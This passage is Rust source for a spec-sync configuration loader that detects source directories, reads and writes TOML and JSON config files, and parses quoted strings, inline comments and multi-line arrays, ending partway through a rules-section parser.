use crate::exports::has_extension;
use crate::manifest;
use crate::types::SpecSyncConfig;
use std::collections::HashSet;
use std::fs;
use std::path::Path;
use walkdir::WalkDir;

/// Directories that should never be treated as source directories.
const IGNORED_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    ".hg",
    ".svn",
    "dist",
    "build",
    "out",
    "target",
    "vendor",
    ".next",
    ".nuxt",
    ".output",
    ".cache",
    ".turbo",
    "coverage",
    "__pycache__",
    ".mypy_cache",
    ".pytest_cache",
    ".tox",
    ".venv",
    "venv",
    "env",
    ".env",
    ".idea",
    ".vscode",
    ".DS_Store",
    "specs",
    "docs",
    "doc",
    ".github",
    ".gitlab",
    "migrations",
    "Pods",
    ".dart_tool",
    ".gradle",
    "bin",
    "obj",
];
const DEFAULT_STATIC_SOURCE_EXTENSIONS: &[&str] = &["html", "htm", "css"];

/// Auto-detect source directories by first checking manifest files
/// (Cargo.toml, Package.swift, build.gradle.kts, package.json, etc.),
/// then falling back to scanning the project root for files with supported
/// language extensions. Returns directories relative to root.
pub fn detect_source_dirs(root: &Path) -> Vec<String> {
    detect_source_dirs_checked(root).unwrap_or_else(|_| detect_source_dirs_by_scan(root))
}

/// Auto-detect source directories while surfacing malformed manifest inputs.
pub fn detect_source_dirs_checked(root: &Path) -> Result<Vec<String>, String> {
    // Try manifest-aware detection first
    let manifest_discovery = manifest::discover_from_manifests_checked(root)?;
    if !manifest_discovery.source_dirs.is_empty() {
        let mut dirs = manifest_discovery.source_dirs;
        dirs.sort();
        dirs.dedup();
        return Ok(dirs);
    }

    // Fall back to directory scanning
    Ok(detect_source_dirs_by_scan(root))
}

/// Discover modules from manifest files (Package.swift, Cargo.toml, etc.).
/// Returns the manifest discovery result for use in module detection.
#[allow(dead_code)]
pub fn discover_manifest_modules(root: &Path) -> manifest::ManifestDiscovery {
    manifest::discover_from_manifests(root)
}

/// Discover manifest modules while surfacing malformed manifest inputs.
pub fn discover_manifest_modules_checked(
    root: &Path,
) -> Result<manifest::ManifestDiscovery, String> {
    manifest::discover_from_manifests_checked(root)
}

/// Scan-based source directory detection (fallback when no manifests found).
fn detect_source_dirs_by_scan(root: &Path) -> Vec<String> {
    let ignored: HashSet<&str> = IGNORED_DIRS.iter().copied().collect();
    let mut source_dirs: Vec<String> = Vec::new();
    let mut has_root_source_files = false;

    // Check immediate children of root
    let entries = match fs::read_dir(root) {
        Ok(e) => e,
        Err(_) => return vec!["src".to_string()],
    };

    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();

        // Skip hidden dirs and ignored dirs
        if name.starts_with('.') || ignored.contains(name.as_str()) {
            continue;
        }

        let path = entry.path();

        if path.is_dir() {
            // Check if this directory contains any source files (scan up to 3 levels deep)
            if dir_contains_source_files(&path, &ignored, 3) {
                source_dirs.push(name);
            }
        } else if path.is_file() && is_detectable_source_file(&path) {
            // Source file directly in root
            has_root_source_files = true;
        }
    }

    // If source files exist directly in root, add "." as a source dir
    if has_root_source_files && source_dirs.is_empty() {
        return vec![".".to_string()];
    }

    if source_dirs.is_empty() {
        // Fallback to "src" if nothing detected
        return vec!["src".to_string()];
    }

    source_dirs.sort();
    source_dirs
}

/// Check if a directory contains source files, scanning up to `max_depth` levels.
fn dir_contains_source_files(dir: &Path, ignored: &HashSet<&str>, max_depth: usize) -> bool {
    for entry in WalkDir::new(dir)
        .max_depth(max_depth)
        .into_iter()
        .filter_entry(|e| {
            if e.file_type().is_dir() {
                let name = e.file_name().to_str().unwrap_or("");
                !name.starts_with('.') && !ignored.contains(name)
            } else {
                true
            }
        })
        .filter_map(|e| e.ok())
    {
        let path = entry.path();
        if path.is_file() && is_detectable_source_file(path) {
            return true;
        }
    }
    false
}

fn is_detectable_source_file(path: &Path) -> bool {
    has_extension(path, &[])
        || path
            .extension()
            .and_then(|extension| extension.to_str())
            .is_some_and(|extension| DEFAULT_STATIC_SOURCE_EXTENSIONS.contains(&extension))
}

/// Load config from TOML or JSON, falling back to defaults.
/// When no config file exists, auto-detects source directories.
///
/// Config file search order (v4 first, then legacy):
/// Read a config file into a String, dropping a leading UTF-8 BOM (U+FEFF). Some
/// editors prepend a BOM; left in place it attaches to the first TOML key (which then
/// becomes an unknown key and is silently ignored) or breaks JSON parsing entirely.
/// Stripping a leading BOM is lossless. Returns None when the file can't be read.
/// Avoids allocating when there is no BOM (the common case).
pub fn read_config_file(path: &Path) -> Option<String> {
    let content = fs::read_to_string(path).ok()?;
    let trimmed = content.trim_start_matches('\u{feff}');
    Some(if trimmed.len() == content.len() {
        content
    } else {
        trimmed.to_string()
    })
}

/// Load config from a specific file path (JSON or TOML based on extension).
/// Used by migration to convert a known source file rather than relying on precedence.
pub fn load_config_from_path(config_path: &Path, root: &Path) -> SpecSyncConfig {
    let ext = config_path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("");
    match ext {
        "toml" => load_toml_config(config_path, root),
        _ => load_json_config(config_path, root),
    }
}

/// 1. `.specsync/config.toml` (v4 TOML — canonical)
/// 2. `.specsync/config.json` (v4 JSON — pre-TOML migration)
/// 3. `.specsync.toml` (legacy root TOML)
/// 4. `specsync.json` (legacy root JSON)
///
/// After loading the shared config, `.specsync/config.local.toml` is read for
/// migration diagnostics. Retired embedded-AI keys are ignored safely.
pub fn load_config(root: &Path) -> SpecSyncConfig {
    let v4_toml = root.join(".specsync/config.toml");
    let v4_json = root.join(".specsync/config.json");
    let legacy_toml = root.join(".specsync.toml");
    let legacy_json = root.join("specsync.json");

    let (mut config, config_path) = if v4_toml.exists() {
        (load_toml_config(&v4_toml, root), Some(v4_toml))
    } else if v4_json.exists() {
        (load_json_config(&v4_json, root), Some(v4_json))
    } else if legacy_toml.exists() {
        (load_toml_config(&legacy_toml, root), Some(legacy_toml))
    } else if legacy_json.exists() {
        (load_json_config(&legacy_json, root), Some(legacy_json))
    } else {
        (
            SpecSyncConfig {
                source_dirs: detect_source_dirs(root),
                ..Default::default()
            },
            None,
        )
    };

    config.config_path = config_path;

    // Read the old local override file only to surface migration guidance.
    let local_toml = root.join(".specsync/config.local.toml");
    if local_toml.exists() {
        inspect_legacy_local_config(&local_toml);
    }

    config
}

/// Inspect a legacy local config file and ignore all retired embedded-AI keys.
///
/// NOTE: this is a second, deliberately minimal line-by-line reader. It handles
/// only SCALAR keys (ai_* and a few strings) — it does NOT support multi-line
/// arrays the way `load_toml_config` does. That is safe today because no array
/// key is read here and `config.local.toml` is never rewritten. If an array key
/// is ever added to local config, route it through the shared array handling
/// (`find_toml_array_close` accumulation) to avoid re-introducing `["["]`
/// corruption.
fn inspect_legacy_local_config(local_path: &Path) {
    let content = match read_config_file(local_path) {
        Some(c) => c,
        None => {
            // Local config is optional, but a file that exists yet cannot be read
            // (not valid UTF-8) must not be silently ignored — its per-developer
            // retired settings would be dropped with no signal.
            if local_path.exists() {
                eprintln!(
                    "Warning: local config {} exists but could not be read (not valid UTF-8 or unreadable); \
                     retired embedded-AI settings are NOT inspected",
                    local_path.display()
                );
            }
            return;
        }
    };

    let mut current_section: Option<String> = None;

    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        if line.starts_with('[') && line.ends_with(']') {
            current_section = Some(line[1..line.len() - 1].trim().to_string());
            continue;
        }

        if let Some(eq_pos) = line.find('=') {
            let key = line[..eq_pos].trim();
            // Only legacy top-level AI fields were supported in local config.
            if current_section.is_some() {
                continue;
            }

            match key {
                key if LEGACY_AI_TOML_KEYS.contains(&key) => warn_retired_ai_key(key),
                _ => {
                    eprintln!("Warning: unknown key \"{key}\" in config.local.toml (ignored)");
                }
            }
        }
    }
}

/// Detect whether this project is using a legacy 3.x layout.
/// Returns true if root-level config files exist without a .specsync/version stamp.
pub fn is_legacy_layout(root: &Path) -> bool {
    let has_root_json = root.join("specsync.json").exists();
    let has_root_toml = root.join(".specsync.toml").exists();
    let has_root_registry = root.join("specsync-registry.toml").exists();
    let has_v4_version = root.join(".specsync/version").exists();

    (has_root_json || has_root_toml || has_root_registry) && !has_v4_version
}

/// Escape a string value for safe embedding in a TOML quoted string.
fn toml_escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}

/// Format a `name = ["a", "b"]` TOML array line (an empty slice → `name = []`).
fn toml_array_line(name: &str, items: &[String]) -> String {
    let body = items
        .iter()
        .map(|s| format!("\"{}\"", toml_escape(s)))
        .collect::<Vec<_>>()
        .join(", ");
    format!("{name} = [{body}]")
}

/// Inverse of `toml_escape`: decodes the backslash, double-quote, newline,
/// carriage-return, and tab escape sequences it emits. Without this,
/// `config_to_toml` writes a correctly-escaped basic string that the reader would
/// load with the escapes still literal — silently changing any value containing a
/// backslash or quote on migrate (e.g. a `schema_pattern` regex, or a Windows
/// module path). An unrecognized escape is left byte-for-byte so a hand-written
/// config with a stray backslash is not mangled.
fn toml_unescape(s: &str) -> String {
    if !s.contains('\\') {
        return s.to_string();
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(ch) = chars.next() {
        if ch != '\\' {
            out.push(ch);
            continue;
        }
        match chars.next() {
            Some('\\') => out.push('\\'),
            Some('"') => out.push('"'),
            Some('n') => out.push('\n'),
            Some('r') => out.push('\r'),
            Some('t') => out.push('\t'),
            // Unknown escape — preserve both characters literally.
            Some(other) => {
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'),
        }
    }
    out
}

/// Serialize a SpecSyncConfig to TOML format string.
pub fn config_to_toml(config: &SpecSyncConfig) -> String {
    let mut lines: Vec<String> = Vec::new();
    lines.push("# spec-sync configuration".to_string());
    lines.push("# Docs: https://github.com/CorvidLabs/spec-sync".to_string());
    lines.push(String::new());

    // Core settings
    lines.push(format!(
        "specs_dir = \"{}\"",
        toml_escape(&config.specs_dir)
    ));

    if !config.source_dirs.is_empty() {
        lines.push(format!(
            "source_dirs = [{}]",
            config
                .source_dirs
                .iter()
                .map(|s| format!("\"{}\"", toml_escape(s)))
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }

    if let Some(ref schema_dir) = config.schema_dir {
        lines.push(format!("schema_dir = \"{}\"", toml_escape(schema_dir)));
    }
    if let Some(ref schema_pattern) = config.schema_pattern {
        lines.push(format!(
            "schema_pattern = \"{}\"",
            toml_escape(schema_pattern)
        ));
    }

    // These three fields default to a NON-empty value in the reader
    // (SpecSyncConfig::default), so an explicitly-empty value (a user opting out of
    // section enforcement / test-file exclusion) must be written as `= []` — omitting
    // it would silently restore the defaults on reload, flipping check/coverage
    // results on migrate. So they are always emitted, empty or not.
    lines.push(toml_array_line("exclude_dirs", &config.exclude_dirs));
    lines.push(toml_array_line(
        "exclude_patterns",
        &config.exclude_patterns,
    ));
    // source_extensions defaults to empty, so omitting it when empty round-trips.
    if !config.source_extensions.is_empty() {
        lines.push(toml_array_line(
            "source_extensions",
            &config.source_extensions,
        ));
    }
    if config.include_extensionless {
        lines.push("include_extensionless = true".to_string());
    }
    if config.require_draft_files {
        lines.push("require_draft_files = true".to_string());
    }

    lines.push(toml_array_line(
        "required_sections",
        &config.required_sections,
    ));

    // Export level
    match config.export_level {
        crate::types::ExportLevel::Type => lines.push("export_level = \"type\"".to_string()),
        crate::types::ExportLevel::Member => {} // default, omit
    }

    // Parse mode (AST is opt-in; regex is the default, so omit it)
    match config.parse_mode {
        crate::types::ParseMode::Ast => lines.push("parse_mode = \"ast\"".to_string()),
        crate::types::ParseMode::Regex => {} // default, omit
    }

    // Enforcement
    match config.enforcement {
        crate::types::EnforcementMode::Warn => {} // default, omit
        crate::types::EnforcementMode::EnforceNew => {
            lines.push("enforcement = \"enforce-new\"".to_string());
        }
        crate::types::EnforcementMode::Strict => {
            lines.push("enforcement = \"strict\"".to_string());
        }
    }

    if let Some(days) = config.task_archive_days {
        lines.push(format!("task_archive_days = {days}"));
    }

    // Rules section
    let rules = &config.rules;
    let has_rules = rules.max_changelog_entries.is_some()
        || rules.require_behavioral_examples.is_some()
        || rules.min_invariants.is_some()
        || rules.max_spec_size_kb.is_some()
        || rules.require_depends_on.is_some();

    if has_rules {
        lines.push(String::new());
        lines.push("[rules]".to_string());
        if let Some(n) = rules.max_changelog_entries {
            lines.push(format!("max_changelog_entries = {n}"));
        }
        if let Some(b) = rules.require_behavioral_examples {
            lines.push(format!("require_behavioral_examples = {b}"));
        }
        if let Some(n) = rules.min_invariants {
            lines.push(format!("min_invariants = {n}"));
        }
        if let Some(n) = rules.max_spec_size_kb {
            lines.push(format!("max_spec_size_kb = {n}"));
        }
        if let Some(b) = rules.require_depends_on {
            lines.push(format!("require_depends_on = {b}"));
        }
    }

    // GitHub section
    if let Some(ref gh) = config.github {
        lines.push(String::new());
        lines.push("[github]".to_string());
        if let Some(ref repo) = gh.repo {
            lines.push(format!("repo = \"{}\"", toml_escape(repo)));
        }
        if !gh.drift_labels.is_empty() {
            lines.push(format!(
                "drift_labels = [{}]",
                gh.drift_labels
                    .iter()
                    .map(|s| format!("\"{}\"", toml_escape(s)))
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        }
        if !gh.verify_issues {
            lines.push(format!("verify_issues = {}", gh.verify_issues));
        }
    }

    // Lifecycle section
    let lc = &config.lifecycle;
    let has_lifecycle = !lc.guards.is_empty()
        || !lc.track_history
        || !lc.max_age.is_empty()
        || !lc.allowed_statuses.is_empty();

    if has_lifecycle {
        lines.push(String::new());
        lines.push("[lifecycle]".to_string());
        if !lc.track_history {
            lines.push(format!("track_history = {}", lc.track_history));
        }
        if !lc.allowed_statuses.is_empty() {
            lines.push(format!(
                "allowed_statuses = [{}]",
                lc.allowed_statuses
                    .iter()
                    .map(|s| format!("\"{}\"", toml_escape(s)))
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        }
        if !lc.max_age.is_empty() {
            lines.push(String::new());
            lines.push("[lifecycle.max_age]".to_string());
            for (status, days) in &lc.max_age {
                lines.push(format!("{status} = {days}"));
            }
        }
        if !lc.guards.is_empty() {
            for (transition, guard) in &lc.guards {
                lines.push(String::new());
                lines.push(format!("[lifecycle.guards.\"{transition}\"]"));
                if let Some(score) = guard.min_score {
                    lines.push(format!("min_score = {score}"));
                }
                if !guard.require_sections.is_empty() {
                    lines.push(format!(
                        "require_sections = [{}]",
                        guard
                            .require_sections
                            .iter()
                            .map(|s| format!("\"{}\"", toml_escape(s)))
                            .collect::<Vec<_>>()
                            .join(", ")
                    ));
                }
                if let Some(no_stale) = guard.no_stale {
                    lines.push(format!("no_stale = {no_stale}"));
                }
                if let Some(threshold) = guard.stale_threshold {
                    lines.push(format!("stale_threshold = {threshold}"));
                }
                if let Some(ref msg) = guard.message {
                    lines.push(format!("message = \"{}\"", toml_escape(msg)));
                }
            }
        }
    }

    // Companions section
    if config.companions.design {
        lines.push(String::new());
        lines.push("[companions]".to_string());
        lines.push("design = true".to_string());
    }

    // Module definitions — one `[modules."name"]` table each. Sorted by name so the
    // output is deterministic (HashMap order is not) for clean diffs and stable tests.
    if !config.modules.is_empty() {
        let mut names: Vec<&String> = config.modules.keys().collect();
        names.sort();
        for name in names {
            let module = &config.modules[name];
            // A module with no files and no deps carries no data and would not
            // round-trip (the reader materializes a module only from a key line),
            // so skip it to keep the writer and reader symmetric.
            if module.files.is_empty() && module.depends_on.is_empty() {
                continue;
            }
            lines.push(String::new());
            lines.push(format!("[modules.\"{}\"]", toml_escape(name)));
            if !module.files.is_empty() {
                lines.push(format!(
                    "files = [{}]",
                    module
                        .files
                        .iter()
                        .map(|s| format!("\"{}\"", toml_escape(s)))
                        .collect::<Vec<_>>()
                        .join(", ")
                ));
            }
            if !module.depends_on.is_empty() {
                lines.push(format!(
                    "depends_on = [{}]",
                    module
                        .depends_on
                        .iter()
                        .map(|s| format!("\"{}\"", toml_escape(s)))
                        .collect::<Vec<_>>()
                        .join(", ")
                ));
            }
        }
    }

    lines.push(String::new()); // trailing newline
    lines.join("\n")
}

/// Config fields that `config_to_toml` cannot faithfully serialize (and that the
/// hand-rolled TOML reader cannot parse back), so converting a config that uses
/// them would silently drop data. `migrate` calls this to refuse rather than lose
/// a user's config on JSON→TOML conversion.
///
/// Keep this in lockstep with `config_to_toml`: when a field gains real TOML
/// round-trip support above, remove it here.
pub fn config_to_toml_lossy_fields(config: &SpecSyncConfig) -> Vec<&'static str> {
    let mut fields = Vec::new();
    if !config.custom_rules.is_empty() {
        // `[[custom_rules]]` array-of-tables (with a nested `applies_to` filter) has
        // no writer above and no support in the hand-rolled reader.
        fields.push("customRules");
    }
    fields
}

/// Known config keys in specsync.json (camelCase).
const KNOWN_JSON_KEYS: &[&str] = &[
    "specsDir",
    "sourceDirs",
    "schemaDir",
    "schemaPattern",
    "requiredSections",
    "excludeDirs",
    "excludePatterns",
    "sourceExtensions",
    "includeExtensionless",
    "requireDraftFiles",
    "exportLevel",
    "parseMode",
    "modules",
    "rules",
    "customRules",
    "taskArchiveDays",
    "github",
    "enforcement",
    "lifecycle",
    "companions",
];

const LEGACY_AI_JSON_KEYS: &[&str] = &[
    "aiProvider",
    "aiModel",
    "aiCommand",
    "aiApiKey",
    "aiBaseUrl",
    "aiTimeout",
];

const LEGACY_AI_TOML_KEYS: &[&str] = &[
    "ai_provider",
    "ai_model",
    "ai_command",
    "ai_api_key",
    "ai_base_url",
    "ai_timeout",
];

fn warn_retired_ai_key(key: &str) {
    eprintln!(
        "Warning: retired embedded-AI config key `{key}` is ignored. spec-sync 5.0 generates deterministic scaffolds; use your coding agent to enrich them."
    );
}

fn load_json_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
    let content = match read_config_file(config_path) {
        Some(c) => c,
        None => {
            // See load_toml_config: a present-but-unreadable config must fail loud
            // rather than silently downgrade enforcement to defaults.
            if config_path.exists() {
                eprintln!(
                    "Warning: config file {} exists but could not be read (not valid UTF-8 or unreadable); \
                     using built-in defaults — its settings (enforcement, required sections, etc.) are NOT applied",
                    config_path.display()
                );
            }
            return SpecSyncConfig::default();
        }
    };

    // Warn about unknown keys
    if let Ok(raw) = serde_json::from_str::<serde_json::Value>(&content)
        && let Some(obj) = raw.as_object()
    {
        for key in obj.keys() {
            if LEGACY_AI_JSON_KEYS.contains(&key.as_str()) {
                warn_retired_ai_key(key);
            } else if !KNOWN_JSON_KEYS.contains(&key.as_str()) {
                eprintln!("Warning: unknown key \"{key}\" in specsync.json (ignored)");
            }
        }
    }

    match serde_json::from_str::<SpecSyncConfig>(&content) {
        Ok(config) => {
            if !content.contains("\"sourceDirs\"") {
                let mut config = config;
                config.source_dirs = detect_source_dirs(root);
                return config;
            }
            config
        }
        Err(e) => {
            eprintln!("Warning: failed to parse specsync.json: {e}");
            SpecSyncConfig::default()
        }
    }
}

/// Parse a TOML config file using zero-dependency parsing.
/// Supports the same fields as specsync.json but with TOML syntax:
///
/// ```toml
/// specs_dir = "specs"
/// source_dirs = ["src", "lib"]
/// schema_dir = "db/migrations"
/// exclude_dirs = ["__tests__"]
/// exclude_patterns = ["**/*.test.ts"]
/// required_sections = ["Purpose", "Public API"]
/// ```
fn load_toml_config(config_path: &Path, root: &Path) -> SpecSyncConfig {
    let content = match read_config_file(config_path) {
        Some(c) => c,
        None => {
            // read_config_file returns None for both "absent" and "present but
            // unreadable". This function is reached only after an `.exists()` check
            // (load_config) or with a known migration source path, so a None on a
            // file that still exists means it could not be read (e.g. not valid
            // UTF-8) — fail loud instead of silently reverting to defaults, which
            // would downgrade enforcement (strict→warn, exit 1→0) with no signal.
            if config_path.exists() {
                eprintln!(
                    "Warning: config file {} exists but could not be read (not valid UTF-8 or unreadable); \
                     using built-in defaults — its settings (enforcement, required sections, etc.) are NOT applied",
                    config_path.display()
                );
            }
            return SpecSyncConfig::default();
        }
    };

    let mut config = SpecSyncConfig::default();
    let mut has_source_dirs = false;
    let mut current_section: Option<String> = None;

    // Peekable so a value that opens a multi-line array can consume its
    // continuation lines while leaving a following key/section un-consumed if the
    // array turns out to be unterminated.
    let mut lines = content.lines().peekable();
    #[allow(clippy::while_let_on_iterator)]
    while let Some(raw_line) = lines.next() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        // Track TOML section headers like [rules]
        if line.starts_with('[') && line.ends_with(']') {
            current_section = Some(line[1..line.len() - 1].trim().to_string());
            continue;
        }

        if let Some(eq_pos) = line.find('=') {
            let key = line[..eq_pos].trim();
            // A value may open a multi-line array (`key = [` with items and the
            // closing `]` on following lines). Accumulate continuation lines until
            // the array's bracket is balanced — otherwise the value is just `[`,
            // which parses to `["["]`, silently dropping the real entries AND
            // (because `migrate` reads then rewrites the config) overwriting the
            // user's file with the corrupted result.
            let raw_value = line[eq_pos + 1..].trim();
            let is_array = raw_value.starts_with('[');
            // Strip an inline `#` comment (quote/escape-aware) from the value. This
            // applies to SCALARS too: `specs_dir = "specs" # note` must parse as
            // `specs`, not the literal `"specs" # note` — otherwise the specs dir
            // mis-resolves and every spec becomes invisible, silently turning
            // `check` into an exit-0 pass. A `#` inside a quoted string is preserved.
            let mut acc = strip_inline_comment(raw_value);
            // Close detection is quote/escape/bracket-depth aware (see
            // `find_toml_array_close`), so a `]` INSIDE a quoted item — e.g. a glob
            // char-class `"**/[abc]/**"` — does not falsely end the array.
            if is_array && find_toml_array_close(&acc).is_none() {
                while let Some(&peeked) = lines.peek() {
                    let cont = strip_inline_comment(peeked.trim());
                    if cont.is_empty() {
                        lines.next(); // consume blank / whole-line comment in array
                        continue;
                    }
                    // Array items are quoted strings — basic `"..."` or literal
                    // `'...'` — and the close is `]`. A continuation line that is none
                    // of these means the `]` was omitted — stop WITHOUT consuming it so
                    // the following key/section still parses, bounding a malformed
                    // array's damage to its own key rather than swallowing the rest of
                    // the file. (These configs never use nested arrays, so a leading
                    // `[` is a following section header, not array content — it must
                    // NOT be absorbed.)
                    if !cont.starts_with('"') && !cont.starts_with('\'') && !cont.starts_with(']') {
                        break;
                    }
                    lines.next();
                    acc.push(' ');
                    acc.push_str(&cont);
                    if find_toml_array_close(&acc).is_some() {
                        break;
                    }
                }
            }
            let value = acc.as_str();

            // Route to section-specific parsing
            if let Some(ref section) = current_section {
                match section.as_str() {
                    "rules" => {
                        parse_toml_rules_key(key, value, &mut config.rules);
                        continue;
                    }
                    "github" => {
                        parse_toml_github_key(key, value, &mut config);
                        continue;
                    }
                    "lifecycle" => {
                        parse_toml_lifecycle_key(key, value, &mut config.lifecycle);
                        continue;
                    }
                    "companions" => {
                        parse_toml_companions_key(key, value, &mut config.companions);
                        continue;
                    }
                    s if s.starts_with("lifecycle.") => {
                        parse_toml_lifecycle_nested(s, key, value, &mut config.lifecycle);
                        continue;
                    }
                    s if s.starts_with("modules.") => {
                        parse_toml_modules_nested(s, key, value, &mut config.modules);
                        continue;
                    }
                    _ => {
                        // Unknown section — skip silently
                        continue;
                    }
                }
            }

            match key {
                "specs_dir" => config.specs_dir = parse_toml_string(value),
                "source_dirs" => {
                    config.source_dirs = parse_toml_string_array(value);
                    has_source_dirs = true;
                }
                "schema_dir" => config.schema_dir = Some(parse_toml_string(value)),
                "schema_pattern" => config.schema_pattern = Some(parse_toml_string(value)),
                "exclude_dirs" => config.exclude_dirs = parse_toml_string_array(value),
                "exclude_patterns" => config.exclude_patterns = parse_toml_string_array(value),
                "source_extensions" => config.source_extensions = parse_toml_string_array(value),
                "include_extensionless" => config.include_extensionless = parse_toml_bool(value),
                "require_draft_files" => config.require_draft_files = parse_toml_bool(value),
                key if LEGACY_AI_TOML_KEYS.contains(&key) => warn_retired_ai_key(key),
                "export_level" => {
                    let s = parse_toml_string(value);
                    match s.as_str() {
                        "type" => {
                            config.export_level = crate::types::ExportLevel::Type;
                        }
                        "member" => {
                            config.export_level = crate::types::ExportLevel::Member;
                        }
                        _ => eprintln!(
                            "Warning: unknown export_level \"{s}\" (expected \"type\" or \"member\")"
                        ),
                    }
                }
                "parse_mode" | "parseMode" => {
                    let s = parse_toml_string(value);
                    match s.as_str() {
                        "ast" => config.parse_mode = crate::types::ParseMode::Ast,
                        "regex" => config.parse_mode = crate::types::ParseMode::Regex,
                        _ => eprintln!(
                            "Warning: unknown parse_mode \"{s}\" (expected \"regex\" or \"ast\")"
                        ),
                    }
                }
                "required_sections" => {
                    config.required_sections = parse_toml_string_array(value);
                }
                "task_archive_days" => {
                    if let Ok(n) = value.trim().parse::<u32>() {
                        config.task_archive_days = Some(n);
                    }
                }
                "enforcement" => {
                    let s = parse_toml_string(value);
                    match s.as_str() {
                        "strict" => {
                            config.enforcement = crate::types::EnforcementMode::Strict;
                        }
                        "enforce-new" | "enforce_new" => {
                            config.enforcement = crate::types::EnforcementMode::EnforceNew;
                        }
                        "warn" => {
                            config.enforcement = crate::types::EnforcementMode::Warn;
                        }
                        _ => eprintln!(
                            "Warning: unknown enforcement \"{s}\" (expected \"warn\", \"enforce-new\", or \"strict\")"
                        ),
                    }
                }
                _ => {
                    eprintln!("Warning: unknown key \"{key}\" in config.toml (ignored)");
                }
            }
        }
    }

    if !has_source_dirs {
        config.source_dirs = detect_source_dirs(root);
    }

    config
}

/// Parse a TOML string value: `"value"` -> `value`
/// Strip an inline TOML comment from a value string.
/// Respects quoted strings — `#` inside quotes is not a comment.
/// Examples:
///   `"ollama" # local`  →  `"ollama"`
///   `120 # seconds`     →  `120`
///   `"has # inside"`    →  `"has # inside"`
fn strip_inline_comment(s: &str) -> String {
    // Track both TOML string kinds: basic `"..."` (backslash-escaped) and literal
    // `'...'` (no escapes). A `#` inside either is content, not a comment.
    let mut in_basic = false;
    let mut in_literal = false;
    let mut prev_backslash = false;
    for (i, c) in s.char_indices() {
        if in_basic {
            if c == '"' && !prev_backslash {
                in_basic = false;
            }
            prev_backslash = c == '\\' && !prev_backslash;
            continue;
        }
        if in_literal {
            // Literal strings have no escapes, so the next `'` always closes.
            if c == '\'' {
                in_literal = false;
            }
            continue;
        }
        prev_backslash = false;
        match c {
            '"' => in_basic = true,
            '\'' => in_literal = true,
            // A `#` outside any string starts a comment.
            '#' => return s[..i].trim().to_string(),
            _ => {}
        }
    }
    s.to_string()
}

fn parse_toml_string(s: &str) -> String {
    let s = s.trim();
    if s.len() >= 2 && s.starts_with('"') && s.ends_with('"') {
        // Quoted basic string: decode the escapes `toml_escape` emits so the value
        // round-trips (an unquoted bare value is left as-is).
        toml_unescape(&s[1..s.len() - 1])
    } else if s.len() >= 2 && s.starts_with('\'') && s.ends_with('\'') {
        // Literal string: content is taken verbatim (TOML literal strings perform no
        // escape processing), so a Windows path or regex keeps its backslashes.
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Return the byte index of the `]` that closes the first `[` in `s`, scanning
/// with quote-, escape-, and bracket-depth awareness so a `[`/`]` inside a quoted
/// string (e.g. a glob char-class `"**/[abc]/**"` or its literal-string form
/// `'**/[abc]/**'`) or a nested array does not count. Both TOML string kinds are
/// tracked: basic `"..."` (backslash-escaped) and literal `'...'` (no escapes).
/// Returns `None` if the array is not closed within `s`.
fn find_toml_array_close(s: &str) -> Option<usize> {
    let mut in_basic = false;
    let mut in_literal = false;
    let mut prev_backslash = false;
    let mut depth: i32 = 0;
    let mut opened = false;
    for (i, ch) in s.char_indices() {
        if in_basic {
            if ch == '"' && !prev_backslash {
                in_basic = false;
            }
            prev_backslash = ch == '\\' && !prev_backslash;
            continue;
        }
        if in_literal {
            if ch == '\'' {
                in_literal = false;
            }
            continue;
        }
        prev_backslash = false;
        match ch {
            '"' => in_basic = true,
            '\'' => in_literal = true,
            '[' => {
                depth += 1;
                opened = true;
            }
            ']' => {
                depth -= 1;
                if opened && depth == 0 {
                    return Some(i);
                }
            }
            _ => {}
        }
    }
    None
}

/// Parse a TOML array of strings: `["a", "b"]` -> vec!["a", "b"]
fn parse_toml_string_array(s: &str) -> Vec<String> {
    let s = s.trim();
    // Extract the span between the first `[` and its matching `]` (quote/depth
    // aware — see `find_toml_array_close`), so a `]` inside a quoted item and any
    // trailing content are tolerated. A value with no array brackets is treated as
    // a single-element array (unchanged behavior).
    let Some(start) = s.find('[') else {
        return vec![parse_toml_string(s)];
    };
    let Some(end) = find_toml_array_close(&s[start..]).map(|rel| start + rel) else {
        return vec![parse_toml_string(s)];
    };
    // Split on commas OUTSIDE quoted strings so a quoted item containing a comma
    // (e.g. a path or glob) is not torn into bogus entries. A bare `split(',')`
    // would mangle `["a, b", "c"]`.
    split_toml_array_items(&s[start + 1..end])
        .into_iter()
        .map(|item| parse_toml_string(item.trim()))
        .filter(|item| !item.is_empty())
        .collect()
}

/// Split a TOML array body on top-level commas, skipping commas inside quoted
/// strings — both basic `"..."` (escape-aware) and literal `'...'` (no escapes).
/// Each returned segment still carries its quotes/whitespace for `parse_toml_string`
/// to strip.
fn split_toml_array_items(body: &str) -> Vec<String> {
    let mut items = Vec::new();
    let mut cur = String::new();
    let mut in_basic = false;
    let mut in_literal = false;
    let mut prev_backslash = false;
    for ch in body.chars() {
        if in_basic {
            cur.push(ch);
            if ch == '"' && !prev_backslash {
                in_basic = false;
            }
            prev_backslash = ch == '\\' && !prev_backslash;
            continue;
        }
        if in_literal {
            cur.push(ch);
            if ch == '\'' {
                in_literal = false;
            }
            continue;
        }
        prev_backslash = false;
        match ch {
            '"' => {
                in_basic = true;
                cur.push(ch);
            }
            '\'' => {
                in_literal = true;
                cur.push(ch);
            }
            ',' => items.push(std::mem::take(&mut cur)),
            _ => cur.push(ch),
        }
    }
    items.push(cur);
    items
}

/// Parse a key=value pair inside a `[rules]` TOML section.
fn parse_toml_rules_key(key: &str, value: &str, rules: &mut crate::types::ValidationRules) {
    match key {
        "max_changelog_entries" => {
            if let Ok(n) = value.trim().parse::<usize>() {
                rules.max_changelog_entries = Some(n);
            }
        }
